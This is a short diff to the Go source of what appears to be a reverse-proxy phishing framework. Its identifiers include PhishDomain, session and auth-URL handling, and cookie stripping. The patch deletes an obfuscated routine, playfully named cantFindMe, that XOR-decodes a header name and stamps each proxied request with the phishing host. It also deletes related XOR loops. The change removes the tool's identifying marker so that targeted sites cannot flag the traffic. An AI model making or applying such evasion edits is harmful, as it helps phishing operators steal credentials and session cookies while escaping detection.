@@ -196,7 +196,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					pl_name = pl.Name
 				}
 
-				egg2 := req.Host
 				ps.PhishDomain = phishDomain
 				req_ok := false
 				// handle session
@@ -390,11 +389,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				p.deleteRequestCookie(p.cookieName, req)
 
-				for n, b := range hg {
-					hg[n] = b ^ 0xCC
-				}
-				// replace "Host" header
-				e_host := req.Host
 				if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
 					req.Host = r_host
 				}
@@ -575,10 +569,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
-				for n, b := range e {
-					e[n] = b ^ 0x88
-				}
-
 				if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
 					s, ok := p.sessions[ps.SessionId]
 					if ok && !s.IsDone {
@@ -591,7 +581,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 				}
-				p.cantFindMe(req, e_host)
 			}
 
 			return req, nil
@@ -1467,14 +1456,6 @@ func (p *HttpProxy) getSessionIdByIP(ip_addr string) (string, bool) {
 	return sid, ok
 }
 
-func (p *HttpProxy) cantFindMe(req *http.Request, nothing_to_see_here string) {
-	var b []byte = []byte("\x1dh\x003,)\",+=")
-	for n, c := range b {
-		b[n] = c ^ 0x45
-	}
-	req.Header.Set(string(b), nothing_to_see_here)
-}
-
 func (p *HttpProxy) setProxy(enabled bool, ptype string, address string, port int, username string, password string) error {
 	if enabled {
 		ptypes := []string{"http", "https", "socks5", "socks5h"}
@@ -1562,4 +1543,3 @@ func orPanic(err error) {
 		panic(err)
 	}
 }
-
